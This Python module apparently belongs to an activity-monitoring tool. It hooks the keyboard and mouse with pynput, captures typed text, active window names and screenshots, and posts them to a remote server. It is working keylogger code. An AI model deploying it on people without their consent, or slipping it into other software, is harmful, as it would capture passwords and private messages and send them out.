from sys import path
path.append('../../')  # Evitar problema de importación circular
from pynput import mouse
from modules import consumerServer
from utils.utils import *
from modules import screenshot as sc
from pynput import mouse, keyboard as pynput_keyboard
from time import time
import threading


def logMouse():
    """
    Log mouse coordinates on click
    """
    print("[Mouse] Mouse logging started...")

    def _on_click(x, y, button, pressed):
        if pressed:  # Se detecta el evento solo si se hace click
            try:
                # sleep(0.4) Ajustar solo para pruebas
                window_name = getActiveWindowInfo("name")
                coordX, coordY = x, y  
                img = sc.take_screenshot(save_image=True)  # Guardar imagen
                print(img)
                print(window_name)
                session.post(consumerServer.SERVER_ADDR, json={
                    "timestamp": timestamp(),
                    "user": USER,
                    "category": "MouseClick",
                    "application": window_name,
                    "event_type": "click",
                    "button": str(button),
                    "coordX": coordX, 
                    "coordY": coordY,  
                    "screenshot": img
                })
            except Exception as e:
                print(f"Error: {e}")
                pass


    # Ejecuta la función correspondiente al realizar click
    with mouse.Listener(on_click=_on_click) as listener:
        listener.join()

def get_key_str(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    else:
        return str(key)

# Mapeo de caracteres de control a combinaciones de teclas
control_char_mapping = {
    chr(i): f'CTRL + {chr(i + 64)}' for i in range(1, 27)
}


def translate_control_chars(char_sequence):
    return ' '.join(control_char_mapping.get(char, char) for char in char_sequence)

def logKeyboard():
    print("[Keyboard] Keyboard logging started...")
    pressed_keys = []
    last_key_time = time()
    timer = None

    def send_data():
        nonlocal pressed_keys
        if pressed_keys:
            window_name = getActiveWindowInfo("name")
            typed_word = ''.join(pressed_keys)
            # Revisar si hay caracteres de control en typed_word
            if any(c in control_char_mapping for c in typed_word):
                typed_word = translate_control_chars(typed_word)  # Traducir caracteres de control solo si es necesario
            img = sc.take_screenshot(save_image=True)
            print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
            session.post(consumerServer.SERVER_ADDR, json={
                "timestamp": timestamp(),
                "user": USER,
                "category": "Keyboard",
                "application": window_name,
                "event_type": "keypress",
                "typed_word": typed_word,
                "screenshot": img
            })
            pressed_keys = []  # Limpiar pressed_keys


    def on_press(key):
        nonlocal last_key_time, pressed_keys, timer
        try:
            if key == pynput_keyboard.Key.space:
                key_char = ' '
            else:
                key_char = key.char
            pressed_keys.append(key_char)
            last_key_time = time()
            if timer is not None:
                timer.cancel()
            timer = threading.Timer(2, send_data)
            timer.start()
        except AttributeError:
            # Control de casos de teclas especiales
            pass

    def on_release(key):
        pass

    # Ejecuta la función correspondiente al pulsar una tecla
    with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()




